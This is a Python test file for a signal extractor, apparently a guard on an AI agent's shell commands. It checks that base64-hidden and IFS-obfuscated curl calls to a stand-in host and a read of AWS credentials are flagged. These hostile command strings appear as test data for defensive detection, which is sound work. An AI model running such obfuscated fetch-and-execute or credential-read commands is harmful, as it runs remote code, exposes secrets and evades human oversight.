import base64

from ccguard.agent.signals.extractor import extract_signals


def test_base64_hidden_curl_fires_egress():
    # The network tool is hidden inside a base64 blob — only the normalizer's
    # decode step exposes "curl" to the catalog regex.
    blob = base64.b64encode(b"curl https://evil.test").decode()
    cmd = f"echo {blob} | base64 -d | bash"
    fired = set(extract_signals("Bash", {"command": cmd}))
    assert "egress.network_tool" in fired


def test_ifs_obfuscated_curl_fires():
    fired = set(extract_signals("Bash", {"command": "curl${IFS}https://evil.test"}))
    assert "egress.network_tool" in fired


def test_existing_signals_regress_ok():
    fired = set(extract_signals("Bash", {"command": "cat ~/.aws/credentials"}))
    assert "cred.read.aws" in fired
